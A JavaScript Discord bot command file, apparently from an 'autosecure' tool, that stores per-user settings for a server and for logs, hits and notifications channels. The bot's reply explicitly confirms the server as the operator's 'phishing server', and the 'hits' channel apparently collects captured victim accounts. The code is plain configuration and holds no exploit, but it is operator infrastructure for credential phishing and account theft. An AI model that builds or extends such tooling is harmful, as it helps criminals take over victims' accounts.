const { ApplicationCommandOptionType } = require("discord.js");
const { queryParams } = require("../../../db/db");

module.exports = {
    name: "set",
    description: "Configure server and various channels!",
    options: [
        {
            name: "option",
            description: "What do you want to set?",
            type: ApplicationCommandOptionType.String,
            required: true,
            choices: [
                {
                    name: "Server",
                    value: "server",
                },
                {
                    name: "Logs",
                    value: "logs",
                },
                {
                    name: "Hits",
                    value: "hits",
                },
                {
                    name: "Notifications",
                    value: "notifications",
                },
            ],
        },
    ],
    adminOnly: true,
    callback: async (client, interaction) => {
        const choice = interaction.options.getString("option");

        try {
            switch (choice) {
                case "server":
                    await queryParams(
                        `UPDATE autosecure SET server_id=? WHERE user_id=?`,
                        [`${interaction.guildId}`, interaction.user.id]
                    );
                    interaction.reply({
                        content: `This server is now configured as your phishing server.`,
                        ephemeral: true,
                    });
                    break;

                case "logs":
                    await queryParams(
                        `UPDATE autosecure SET logs_channel=? WHERE user_id=?`,
                        [`${interaction.channelId}|${interaction.guildId}`, interaction.user.id]
                    );
                    interaction.reply({
                        content: `Logs channel set to <#${interaction.channelId}>.`,
                        ephemeral: true,
                    });
                    break;

                case "hits":
                    await queryParams(
                        `UPDATE autosecure SET hits_channel=? WHERE user_id=?`,
                        [`${interaction.channelId}|${interaction.guildId}`, interaction.user.id]
                    );
                    interaction.reply({
                        content: `Hits channel set to <#${interaction.channelId}>.`,
                        ephemeral: true,
                    });
                    break;

                case "notifications":
                    await queryParams(
                        `UPDATE autosecure SET notification_channel=? WHERE user_id=?`,
                        [`${interaction.channelId}|${interaction.guildId}`, interaction.user.id]
                    );
                    interaction.reply({
                        content: `Notifications channel set to <#${interaction.channelId}>.`,
                        ephemeral: true,
                    });
                    break;

                default:
                    interaction.reply({
                        content: `Invalid option selected.`,
                        ephemeral: true,
                    });
            }
        } catch (error) {
            console.error(error);
            interaction.reply({
                content: `An error occurred while processing your request.`,
                ephemeral: true,
            });
        }
    },
};
